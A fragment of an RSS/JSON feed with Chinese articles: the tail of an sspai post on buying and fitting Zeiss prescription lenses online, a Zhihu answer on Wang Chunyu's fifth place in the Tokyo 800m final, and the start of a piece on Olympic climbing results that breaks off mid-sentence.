href=\"http://sh.sina.com.cn/news/k/2020-11-07/detail-iiznctke0128267.shtml\">具有抗病毒功能的膜层</a>。这几年比较受关注的防蓝光功能，根据品牌的不同，通过基材和镀膜都可能实现。</p>\n<blockquote>\n<p>镜片行业产业链主要由上游的原材料和辅料供应商、设备供应商，中游的镜片生产厂商以及下游的代理商、经销商和镜片零售商组成，其中零售商包括连锁眼镜零售商、眼镜零售门店、电商平台、民营眼科医院以及综合医院附属的配镜中心等。上游厂商主要向中游生产商提供树脂、玻璃、塑料及模具、光学添加剂等镜片生产原料和生产设备，此外还向下游零售商提供验配设备；中游的镜片生产厂商除了加工生产镜片成品和定制的车房片，还要承担材料、膜层、工艺技术、光学性能等方面的研发设计工作，并为下游销售渠道提供销售折扣、专业设备、加工、售后、销售员及视光师专业培训等支持；下游零售商直接面对终端消费者，需要在门店配置专业设备和专业视光人员，为消费者提供验光、配镜、镜片镜架装配、试戴体验等专业服务。 </p>\n<p>——《2020 年中国眼镜镜片行业白皮书》</p>\n</blockquote>\n<p>因此，在选择镜片阶段，我的结论是——</p>\n<ol>\n<li>对于最终的佩戴效果来说，准确的验光和镜片加工，比镜片本身更重要；</li>\n<li>对于基本款镜片（非高度近视、无特殊功能需求、无特殊面型）来说，购买价格较低的国产镜片完全没有问题，也是性价比更高的选择，国际大牌的基本款镜片基本上只是在镀膜上有优势，也存在较高的品牌溢价；</li>\n<li>如果有特殊的需求，例如防蓝光、渐进片、驾驶特化型镜片，特别是渐进片这类对于面型设计技术要求较高的款式，则优先选择大品牌的相应款式；</li>\n<li>如果预算可以提高，可以考虑选择更高端的面型的镜片，例如内非球面和双非球面，乃至使用自由曲面技术的定制镜片，也可以酌情考虑升级镀膜，通常，同一款式的镜片升级镀膜的价格不会太高。</li>\n</ol>\n<h3>我的镜片与购买渠道选择</h3>\n<p>这次更换镜片，我给自己的预算是一对镜片 1000 元以内。经过一番考虑，我选择在 1688 平台上购买蔡司智锐单光版镜片，大概有以下几个原因——</p>\n<ol>\n<li>在高端镜片品牌中，蔡司在国内是市场最大的，代理商也很多，因此 1688 上可以用接近批发价的价格买到蔡司的镜片，同时售后等也比较有保障，而尼康、罗敦斯徳、精工等品牌，虽然在类似的档次也有自己独到的技术，但因为渠道较少，因此很难找到比较便宜的价格，基本上只能用门市价买到，或者借助不稳定因素更大的代购，我并没有特殊需求，因此在这个预算下，购买蔡司是更具有性价比，也更方便的选择，我要购买的镜片也并非顶级，当然希望在同预算下可以买到相对更高端一些的产品；</li>\n<li>也是因为在国内市场较为成熟，蔡司有很方便的防伪系统，镜片本身的真伪和镜片原厂加工的流程都可以直接从官方公众号查询确认，同时，我选择的蔡司智锐是这两年新推出的较新型号，几乎全线都是定制片，下单之后才会根据我的需求进行生产加工，因此买到假冒伪劣产品或者库存镜片的可能性几乎不存在；</li>\n<li>在蔡司的产品线中，智锐是通用型镜片，适合各种类型的使用者，同时，也是因为它是最新推出的产品，许多曾经只在更贵的高端产品（如博锐和臻锐）中使用的技术——例如精密成型——都用在了智锐上面，还增加了特有的针对年龄优化的参数，因此在目前的定制镜片中，应该算是很实惠的了，此外，智锐也专门为经常使用电子产品的场景进行了优化，对于每天要花很长时间盯着屏幕的我也比较合适。</li>\n</ol>\n<p>我在 1688 上购镜的价格是每片 372 元，同时加了 50 元选择了原厂加工服务，而同款镜片的官方标价为 3180 元每对。作为批发平台，1688 上有不少价格非常便宜的蔡司镜片，可以根据需要自行搜索。基本上，只要商家可以提供镜片的原始包装袋、以及原厂加工的加工单，加上核对收到的镜片包装和镜片本身的水印防伪，基本上就可以确定镜片没有问题了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/01/c423def69e20ddcb2b905a38cc4ff1fd.JPG\"><figcaption>镜片加工单和包装袋，上面会包含防伪查询信息</figcaption></figure><p>根据我的经验，靠谱的线下店能够提供的比较低的价格大概是官方产品册标价的 6 折左右，在有活动或者结合各种优惠的情况下，5 折也不少见，对应到这款镜片就是 795 至 954 元每片，参考实体店额外的人员、房租等成本，大家可以自行估计价格的合理程度。</p>\n<h2>镜片的加工与装配</h2>\n<p>前文提到，对于定制镜片来说，往往需要测量一些额外的参数，才能真正的进行定制。但如果你打算从电商渠道购买，就会碰到一个很尴尬的问题：很多数据自己测量会非常不精确，但是如果自己去眼镜店要求测量却不在店里配镜，店员又未必愿意为你提供服务。</p>\n<p>蔡司的情况会好一些。蔡司在很多城市的眼镜店中都配备了 <a href=\"https://www.zeiss.com.cn/vision-care/eye-care-professionals/products/instruments-technology/i-terminal-2-lens-customisation.html\">i.Terminal</a> 设备，可以用标准化的流程测量镜架的相关数据，通常这样的眼镜店也相对高端，可以提供付费的验光和测量服务，价格在几十到上百不等。购买这样的服务往往可以得到负责任的对待，我认为为了配到一副合适的眼镜，这个价格是非常值得，也是必要的。</p>\n<p>在微信中搜索「蔡司睛选」小程序，选择「探店」，就可以查到当地哪些眼镜店拥有哪些设备了，我自己就是在小程序中找到附近提供设备的眼镜店，在大众点评上购买测量套餐并预约前往的。一些更高端的店铺会配备 <a href=\"https://www.zeiss.com.cn/vision-care/eye-care-professionals/products/instruments-technology/i-profiler.html\">i.Profiler plus</a> 自动验光仪，可以测量角膜地形图，并获得可以精确到 1 度的更精准的验光处方，i.Profiler 比 i.Terminal 更少见（因为更贵），也不是配镜必须的，它最终提供的还是验光处方，只是数据可能更可靠和精确，如果你查到附近有配备它的眼镜店，价格也合适的话，不妨一并试试。</p>\n<p>对于配镜处方，只要是配过眼镜的朋友应该都不陌生，大多数线下眼镜店都会为配镜的顾客提供附带的免费验光服务并开具处方。不过，<strong>为了获得更加准确的结果，特别是在本文中的线上配镜的场景，付费验光可能是更好的选择。</strong>一个正规的配镜处方有主观和客观验光两部分，通过综合验光仪得到的自动客观验光结果，只能反映当前的眼部情况，作为配镜的参考，但验光处方是不应直接用来配镜的，一个正规的配镜验光过程必需再经过问诊、散光精测、主视眼测试、双眼平衡等步骤。关于验光，更详细的介绍可以参阅<a href=\"https://zhuanlan.zhihu.com/p/166298197\">《一个好的验光过程应该是怎样的？》</a>一文。</p>\n<p>至于具体在哪里验光，可以找当地提供单独综合验光服务的大型眼镜店、眼科医院等进行，如果在过程中发现仅仅使用了自动测光结果、测光师操作明显不熟练、基本没有问诊等情况，建议找具有资质的验光师重新验光。</p>\n<p>我这次单独验光总结出的一个小技巧是：许多眼镜店会把自己的付费验光套餐放在大众点评上出售电子券，在点评里面搜索「综合验光」，就可以比较容易地筛选出当地提供单独付费眼光服务的商家，可能因为付费验光属于国内传统的眼镜消费流程之外的服务，许多眼镜店也会在这里详细写出验光服务的内容和验光师的资质，这也大大方便了我们作为消费者的挑选，以我在杭州观察到的情况，通常 40 至 100 元就可以获得质量非常高的验光服务了，甚至可以指定国家一级验光技师验光<sup class=\"ss-footnote\" href=\"\" title=\"注释：验光师的职业技术资格分为：初级验光员、中级验光员、高级验光员、二级技师、一级技师，对验光师的工作年限、经验和技术有相对应的要求，如果能找到高级验光员以上的验光师，得到的配镜处方基本上是可以完全放心的。\" footnote-id=\"2\">2</sup>。如果时间和预算充足，一些专门的眼科医院和更专业的机构也提供包括了眼部疾病筛查的更细致的验光和检查服务，不过这就不完全属于配镜的范畴了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/03/cb28dd2aea7fe614fb31da571c7d51af.JPEG\"><figcaption>《大众点评》上找到的付费验光服务</figcaption></figure><p>上文还提到，我在购镜时选择了原厂加工服务。所谓的原厂加工，并非将你的镜架和镜片送到蔡司镜片的广州工厂去加工，而是送到蔡司自己开设的加工中心，目前共有 19 个，在不同的省市都有设置，蔡司官方的两篇文章对镜片的装配有详细的介绍（<a href=\"https://mp.weixin.qq.com/s/fmV1LP3fDMn79bSBRFGvrw\">上</a>、<a href=\"https://mp.weixin.qq.com/s/DQLcKdEHXI_5x0Njcnmc6w\">下</a>）。除了蔡司之外，依视路等品牌也有设置自己的加工中心，逻辑类似。原厂加工的好处主要有：</p>\n<ol>\n<li>可以保证镜片是正品。首先，可以送至原厂加工本身，就可以证明你购买镜片的经销商是经过蔡司正规授权的，加工中心也只会加工正品的镜片，并会提供可追溯的加工单，售后也更有保障；</li>\n<li>加工更精确。官方的加工中心具有比较严格的装配标准，也所使用的设备都是较为高级的全自动设备，虽然未必一定比所有眼镜店配备的设备都强，但肯定是强于大多数小型眼镜店的，并且对于定制镜片来说，官方的加工中心对一些定制参数的把握要更精确。此外，因为镜片和加工中心都是蔡司自营的，因此如果精片在加工过程中损坏，对于官方加工中心来说，直接换一片新的就可以了，但如果是眼镜店自行加工，可能会带来不必要的扯皮。</li>\n</ol>\n<p><strong>无论是线上还是线下配镜，加工都是一个非常标准化的流程</strong>，也就是说，最好的装配就是严格按照眼镜店提供的参数单进行的装配，反过来说，如果你的参数本身有问题，装配工人再厉害也救不了。这也是我认为网上配镜可行的原因，只要是在负责任的线下店进行验光和参数测量，你拿到的参数就可以是准确的，和线下配镜无异，可以尽可能的缩小线上线下配镜可靠程度的差距。</p>\n<p>当然，许多大型的连锁眼镜店也会配备自己的加工中心，设备和技术也未必会比原厂差，如果你购买的是非定制镜片和设计比较常规的镜架，交给眼镜店自行加工通常可以更快地拿到眼镜，通常不会有太大的问题。但如果你去的是规模不明的小眼镜店、买了定制片、使用装配工艺比较复杂的镜架、或者是线上下单的话，最稳妥的方式还是选择原厂加工，这是获得高品质且有保障的眼镜加工、装配最简单的方法。</p>\n<h2>流程总结和配镜结果</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/e330dda228f495beb3438a91a173a682.png\"></figure><p>最后，简单总结一下我这次的配镜流程：</p>\n<ol>\n<li>选定自己需要的镜片，如果是定制片，同时确定所需的定制参数；</li>\n<li>准备好验光处方和定制参数数据。在我自己的例子里，我通过蔡司小程序找到了本地的合作眼镜店，付费进行了验光和定制参数测量；</li>\n<li>和线上卖家沟通，确定配镜参数，下单镜片并选择原厂加工；</li>\n<li>邮寄镜架给卖家，等待装配；</li>\n<li>收货，检查镜片包装并试戴，确认眼镜装配正常。</li>\n</ol>\n<p>下单并寄出镜架十天后，我收到了装配完成的眼镜。最大的感受是，智锐对于屏幕的优化确实名不虚传，和之前使用的折射率相同的 JINS 普通镜片相比，智锐用来看近处的手机和电脑屏幕可以明显感觉到视野变大和清晰明亮了，眼睛的适应也比看远景快了一天左右（整体上，我完全适应新镜片大约花了三天时间），看非屏幕的其他场景虽然没用显著的惊艳，但也非常清晰明亮，对于眼镜，如果能够让你尽可能感觉不到它的存在，那就是一副好眼镜吧。</p>\n<hr>\n<p>参考文章</p>\n<ul>\n<li><a href=\"https://idei.nju.edu.cn/22/0f/c26392a533007/pagem.htm\">《打造县域特色产业：丹阳眼镜产业的阶段性探索与启示》</a></li>\n<li><a href=\"http://report.iresearch.cn/report/202101/3718.shtml\">《2020 年中国眼镜镜片行业白皮书》</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/264765611\">《从消费者角度谈眼镜片的选择》</a></li>\n<li><a href=\"https://wsgzao.github.io/post/glasses/\">《作为程序猿我为什么选择了一副比 A4 纸还轻的眼镜》</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/20218552\">《验光 3.0 时代的检查项目（二）》</a></li>\n<li><a href=\"https://family.pconline.com.cn/1271/12717530.html\">《这可能是最严苛的眼镜片横评：100 到 1000 元的差距在哪里？》</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n","link":"https://sspai.com/post/68035"},{"title":"如何评价 2020 东京奥运会田径女子 800 米决赛王春雨创个人最好成绩获第 5 ？","date":"2021-08-05 06:15:55","description":"\n<p>赛后知道一个小细节，更加理解为何昨天王春雨从赛后直到媒体混采区，一直都在抽泣——她说，<b>自己赛前已经偷偷准备好了领奖服。</b></p>\n<p>尽管可能没有多少人（哪怕是自己人），会相信她能最终站台。</p>\n<p>带着眼泪的「个人最佳」和「创造历史」，特别令人动容。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-112a152b20eda49afd123ad3af2db783_720w.jpg?rss\" data-caption=\"2016年里约奥运，王春雨1分59秒93首次晋级奥运半决赛；2020东京奥运会，则再一次提升，跻身决赛并位列第五。图/Lucy Nicholson\" data-size=\"normal\" data-rawwidth=\"2160\" data-rawheight=\"1214\" data-watermark=\"watermark\" data-original-src=\"v2-112a152b20eda49afd123ad3af2db783\" data-watermark-src=\"v2-4956b549d15c880d2c1fdd08ad69dd77\" data-private-watermark-src=\"v2-c7474485f2d709ef6fb9468940bd0805\"></p>\n<p><br></p>\n<p>女子800米决赛的八名选手在昨天都是超水准的发挥，6人创造了PB（个人最佳）、1人创造了SB（赛季最佳）。包括冠军是美国新国家纪录（1分55秒21）、亚军是英国国家纪录（1分55秒88）。</p>\n<p><b>在这样一场几乎所有选手都拿出自己110%实力的「PB决战」中，王春雨的1分57秒00、第五名的成绩，含金量极高极高。</b></p>\n<p>对她个人来说，也是继半决赛后三天时间再次大幅PB，很厉害。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-caf7708210c60d1c1687b047e25ddb5f_720w.jpg?rss\" data-caption=\"NR是国家纪录，PB是个人最好成绩，SB是该选手本赛季最好成绩\" data-size=\"normal\" data-rawwidth=\"1748\" data-rawheight=\"630\" data-watermark=\"watermark\" data-original-src=\"v2-caf7708210c60d1c1687b047e25ddb5f\" data-watermark-src=\"v2-1631582542cd69aa97afbddacfa1317c\" data-private-watermark-src=\"v2-386ec9984fe4cf0526965c30d6b5df70\"></p>\n<p><br></p>\n<p>赛后王春雨说了一番话，</p>\n<p>“（第五）证明了自己是可以的，但还是遗憾没能站上领奖台。也许是自己水平不够，跟她们还有差距。”</p>\n<p>“<b>这个差距是可以训练出来的，我觉得自己有一天会战胜她们。</b>”</p>\n<hr>\n<p>复盘一下王春雨的东京奥运会之旅。</p>\n<p><br></p>\n<h3>7月30日第一轮，2分00秒05，小组第三晋级半决赛</h3>\n<p>王春雨东京奥运会前表现出的状态非常好，赛前20天曾在杭州跑过一场邀请赛，轻松跑出1分59秒18——<b>这是自1997年上海八运会以来、中国女子800米的最好成绩。</b></p>\n<p>这场比赛对王春雨来说只是奥运前的最后热身赛，并不算完全展现实力，也可见王春雨当下的状态和能力。</p>\n<p>东京的第一轮和半决赛只相隔一天，王春雨也尽量会以最低的消耗确保自己晋级、并在半决赛发挥。最终2分00秒05，小组第三，顺利晋级半决赛。</p>\n<p><br></p>\n<p>5年前的里约，王春雨已经晋级过奥运半决赛，当时她的实力和目标就是半决赛，第一轮就得全力输出（1分59秒93），到了半决赛位列小组第八（2分04秒05）。东京奥运会王春雨不管能力和目标显然都要远得多。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-91a07c34349015a138ad9285d8497c65_720w.jpg?rss\" data-caption=\"里约时，王春雨力拼进入半决赛，第一轮已经全力输出，最终半决赛2分04秒05小组第八\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"349\" data-watermark=\"watermark\" data-original-src=\"v2-91a07c34349015a138ad9285d8497c65\" data-watermark-src=\"v2-147bc558c219281709e80bfade701efd\" data-private-watermark-src=\"v2-ec7cccb094bbd797ae8ec4244083b753\"></p>\n<p><br></p>\n<h3>7月31日半决赛，1分59秒14，小组第二晋级决赛</h3>\n<p>前400米59秒5（第一）、后400米59秒6（最终小组第二），1分59秒14小幅刷新个人PB，小组仅落后基利·霍奇金森0.02秒（基利最终决赛拿了银牌）。</p>\n<p>顺利进入决赛。</p>\n<p><b>首位进入奥运会女子800米决赛的中国运动员，第二位进入决赛的亚洲选手——这个第二让整个亚洲等了近百年，上一次要追溯到1928年阿姆斯特丹奥运会的人见绢枝</b>（当时21岁的日本人人见绢枝拿了银牌，可惜她因为肺结核24岁就去世了）。</p>\n<p>后面是三天后的决赛。</p>\n<p><br></p>\n<h3>8月3日决赛，1分57秒00，第五</h3>\n<p>决赛对王春雨就是拼。这种拼甚至还有破釜沉舟的意味在里面，包括她不断给自己一些暗示，剑指名次、冲击领奖台——这也是很多人（包括我们自己人）兴许都并没有对王春雨报以如此高的期望，王春雨自己却有更高的要求。</p>\n<p><br></p>\n<p>一个细节，完成半决赛后王春雨还和记者开玩笑说，“下一场（决赛）我走完两圈也是第八了，<b>但我觉得我不可能是第八，我想拼一个更好的名次。</b>”</p>\n<p>最后看，这种高要求没有变为负担，相反成了很强的驱动力。</p>\n<p>特别棒。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-daf4159d3d5b7eb309f15164eca6983b_720w.jpg?rss\" data-caption=\"东京奥运会中国不少女选手都有自己的幸运小细节，比如杨倩的小黄鸭头饰、美甲，比如鲍珊菊/钟天使的毛主席佩章等，王春雨的幸运符就是红色蝴蝶结。\" data-size=\"normal\" data-rawwidth=\"2170\" data-rawheight=\"3000\" data-watermark=\"watermark\" data-original-src=\"v2-daf4159d3d5b7eb309f15164eca6983b\" data-watermark-src=\"v2-1293107dfbeaf2318a16ea47af1ab424\" data-private-watermark-src=\"v2-d611ed594dab7610a9c0ce8ef42585bd\"></p>\n<p><br></p>\n<p>解读一下决赛：</p>\n<p><br></p>\n<p>决赛王春雨第二道出发；</p>\n<p>800米内道选手，如果想争夺名次的话，并道后需要特别留意不能被外道选手给卡在里面，这样后面的突围和冲刺很容易失去自己的节奏。王春雨也是很担心这一点，所以并道后，她是想跟住美国人穆的（后来的冠军，1分55秒21）。不过并没能跟到穆后面；</p>\n<p>——看过比赛的应该会有印象，外圈选手并道的瞬间是很“凶”的，并道也是特别的决绝；</p>\n<p>此后王春雨的位置一直在3-5名间左右，<b>比赛前400米58秒2、排名第四</b>；</p>\n<p>比赛后半程看的很振奋。<b>王春雨中后段（大约600米处）有落到后面，一度让人觉得是不是就此会被落下</b>；</p>\n<p>然后她还是咬牙跟住了；</p>\n<p><b>迎来最后100米直道冲刺时，她的排名回到第六、在内道的位置。最后90米，王春雨突然很坚决的选择往外跑，转到了第三道开始最后冲刺</b>；</p>\n<p>后半程的落后，也是王春雨与穆、基利等选手实力差距的呈现。但王春雨丝毫没有稳妥完赛的意思，真的是毫无保留的拼了最后这段；</p>\n<p>美国的天才少女、19岁的穆最后和别人的差距越拉越大如愿第一个冲线。当时转播画面里王春雨也是大跨步的在冲，完全没有松懈；</p>\n<p>最后第五名完赛，落后铜牌罗杰斯0.18秒、第四简玛·里基0.1秒，其实互相之间的差距并不大。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-b605f4ddb69994aa8a4c588d4ae417e8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2824\" data-rawheight=\"1796\" data-watermark=\"watermark\" data-original-src=\"v2-b605f4ddb69994aa8a4c588d4ae417e8\" data-watermark-src=\"v2-5dac5fc7d14ae975750ce64bd49e6d15\" data-private-watermark-src=\"v2-13249668e591f538b21400f4a57b3a42\"></p>\n<p><br></p>\n<p><b>1分57秒00，比自己三天前跑出的个人PB提升了整整2.14秒</b>，这显然是很超神的表现了——主观来讲，这种超神表现给予的震撼丝毫不亚于苏炳添前几天的9秒83。</p>\n<p>甚至于，可能是赛后到写这个回答、刚刚重新看遍比赛，以及王春雨自己的赛后复盘，还产生更多“好可惜啊”的感觉……</p>\n<p><br></p>\n<p>决赛的八位选手发挥真的都很出色，互相之间的竞争角逐也让每个人都跑出了很快的成绩。“其他人表现一般，王春雨这个发挥是否就拿牌了？”的假设客观来说，本质并不成立。</p>\n<p>这点要承认。</p>\n<p>也无法去奢求或者假象，如果王春雨跑得更快一些会怎样。这个26岁安徽姑娘，已经完全输出了自己的能力。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f3d373ba77d7bf67268d5e24a1c2efd0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5000\" data-rawheight=\"3333\" data-watermark=\"watermark\" data-original-src=\"v2-f3d373ba77d7bf67268d5e24a1c2efd0\" data-watermark-src=\"v2-5d5fa3872bea66d5b87f43e28501ddb8\" data-private-watermark-src=\"v2-1a2740533e0ce38823d5926f47c21c49\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-112a152b20eda49afd123ad3af2db783_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2160\" data-rawheight=\"1214\" data-watermark=\"watermark\" data-original-src=\"v2-112a152b20eda49afd123ad3af2db783\" data-watermark-src=\"v2-4956b549d15c880d2c1fdd08ad69dd77\" data-private-watermark-src=\"v2-c7474485f2d709ef6fb9468940bd0805\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-3df88e9dbadcf260482f6ccfd24c35e4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1366\" data-watermark=\"watermark\" data-original-src=\"v2-3df88e9dbadcf260482f6ccfd24c35e4\" data-watermark-src=\"v2-e51fb00d57685dac7da7a313053d7db1\" data-private-watermark-src=\"v2-135681aaaa064958b3b3ac7e1f0f0682\"></p>\n<p><br></p>\n<p>王春雨亚锦赛、亚运会都已拿到过第一名，两届奥运会，里约和东京也已经最好的证明了自己的实力。</p>\n<p>三年后的巴黎奥运会，很难想象王春雨还会站上决赛。不过对东京赛后王春雨的这句话，还是坚信不疑——</p>\n<p>“<b>这个差距是可以训练出来的，我觉得自己有一天会战胜她们。</b>”</p>\n<p><br></p>\n<p>不光你觉得，我们也这样觉得。一定会的。</p>\n<p>兴许明年的杭州亚运会，王春雨依然会（在成绩上）更进一步。</p>\n<hr>\n<p>东京奥运会期间，相关的赛事资讯都会在知乎想法中发布，感谢关注<a href=\"https://www.zhihu.com/org/yun-dong-fen-zi-cheng-lan-wen-hua\" class=\"internal\">运动分子</a></p>\n<hr>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/476493978/answer/2032949449\" class=\"internal\">2020 东京奥运跳水女子 3 米跳板决赛施廷懋、王涵包揽冠亚军，如何评价本场比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/476149568/answer/2029677017\" class=\"internal\">2020 东京奥运田径男子 10000 米埃塞俄比亚选手巴雷加夺得田径首金，如何评价本场比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/476000617/answer/2028599848\" class=\"internal\">如何评价 2020 东京奥运会游泳男子 200 米个人混合泳决赛汪顺夺金？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474850082/answer/2026108063\" class=\"internal\">奥运射击选手是如何看清靶子的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474575633/answer/2024002780\" class=\"internal\">为什么一些国家的奥运乒乓球选手是华人？</a></li>\n<li><a href=\"https://www.zhihu.com/question/50191573/answer/1953518631\" class=\"internal\">为什么中国运动员运动寿命短？</a></li>\n<li><a href=\"https://www.zhihu.com/question/344468000/answer/1854947316\" class=\"internal\">新中国体育史上，有哪些比赛的瞬间令你沸腾？</a></li>\n<li><a href=\"https://www.zhihu.com/question/373511126/answer/1608008791\" class=\"internal\">举重运动员有多牛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/341661943/answer/1452491051\" class=\"internal\">撑杆跳这项运动的意义是什么，是如何发明的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/293545938/answer/489299124\" class=\"internal\">一个身体素质普通的人被车拉着能达到博尔特的速度吗？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39665045/answer/275431053\" class=\"internal\">历史上有哪些精心布局却被对方一下破局的故事？</a></li>\n<li><a href=\"https://www.zhihu.com/question/20403477/answer/712635036\" class=\"internal\">110 米栏的顶级运动员，为什么他们不参加100米的比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/302684797/answer/544389984\" class=\"internal\">男生100m跑到11s很奇怪嘛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/282601379/answer/528371413\" class=\"internal\">跑150米然后截取速度最快的连续100米区间作为100米的成绩是否更合理？</a></li>\n<li><a href=\"https://www.zhihu.com/question/352385663/answer/884879335\" class=\"internal\">为什么马拉松选手最后不冲刺？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39239070/answer/594491009\" class=\"internal\">体育赛事中有哪些「几乎不可破」的纪录？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">跑5公里需要多少分钟？</a></li>\n<li><a href=\"https://www.zhihu.com/question/407047274/answer/1363793504\" class=\"internal\">很多退役的军人都说自己五公里可以15/16分，军队的训练真的这么强么？</a></li>\n</ul>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yun-dong-fen-zi-cheng-lan-wen-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">运动分子</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/477063063/answer/2039110968?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">124 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/477050158?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价东京奥运会王春雨在800米决赛中的表现？</a><br><a href=\"http://www.zhihu.com/question/476608971?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价中国羽毛球队在东京奥运会上的比赛成绩？</a><br>\n","link":"http://www.zhihu.com/question/477063063/answer/2039110968?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价街舞（breaking）、滑板、攀岩和冲浪正式成为 2024 年巴黎奥运会比赛正式项目?","date":"2021-08-05 06:15:47","description":"\n<p>东京奥运会攀岩预赛结束更新：</p>\n<p>中日韩三国赛果如下：</p>\n<p>男子组：中国的小将潘愚非速度赛排名第20位，抱石赛排名第8位，难度攀登比赛排名第7位，最终总成绩第14位，无缘决赛；</p>\n<p>日本队，一哥Tomoa Narasaki发挥出色，不专攻速度赛的他爬出了5.94秒位居第2，抱石赛也高居第2，在基本已经确保晋级的情况下难度攀登轻松上阵排名第14，总成绩第2位进入决赛。另一名选手Kai Harada总成绩排名第18位，无缘决赛；</p>\n<p>韩国队唯一的入围选手Jongwon Chon排名第十与决赛失之交臂。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-86204dbc607449903f154aee883cf4a6_720w.jpg?rss\" data-caption=\"中国选手潘愚非在抱石比赛中，转自国际奥委会官方微博\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1349\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>女子组：专攻速度的中国小将宋懿龄速度赛爬出了6.46秒的好成绩，位居第3位，但是受到肩伤影响的她抱石赛排名第19位，难度攀登比赛排名第18位，最终总成绩第12位无缘决赛；</p>\n<p>日本队，老将Akiyo Noguchi和中生代选手Miho Nonaka分别以总成绩第4位和第3位晋级，毫无悬念；</p>\n<p>韩国队的天才少女Chae-hyun Seo在速度赛仅仅爬出第17名的情况下，抱石赛取得第5名，难度攀登更是豪取第1名，以总成绩第2名的成绩挺进决赛。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-acd6f6881d2abd2e952bf049c4afe3b1_720w.jpg?rss\" data-caption=\"中国选手宋懿龄在速度比赛中，转自国际奥委会官方微博\" data-size=\"normal\" data-rawwidth=\"1514\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>资格赛，中日韩三方的表现基本在笔者的预测范围内。中国两位小将其实需要发挥出自己的全部实力，加上一些些运气才可以晋级。只不过，潘愚非的速度赛稍微欠缺了一些运气，宋懿龄受到奥运会资格赛期间肩伤的影响并没有完全恢复，在战略性放弃抱石赛保存体力避免受伤的情况下难度攀登还是未能克服伤病影响。但是这一次他们的表现已经足够出色，中国的攀岩水平还在不断上升，让我们期待2024年巴黎奥运会速度攀岩和其他两项分开之后，这两位选手和其他中国选手的表现。</p>\n<p>这次奥运会，大家都是时隔很久看到大多数选手登场，所以也是对他们闭关修炼的一个检验。很明显日本队对于速度攀岩的训练得到了回报，潘愚非和韩国的小将Chae-hyun 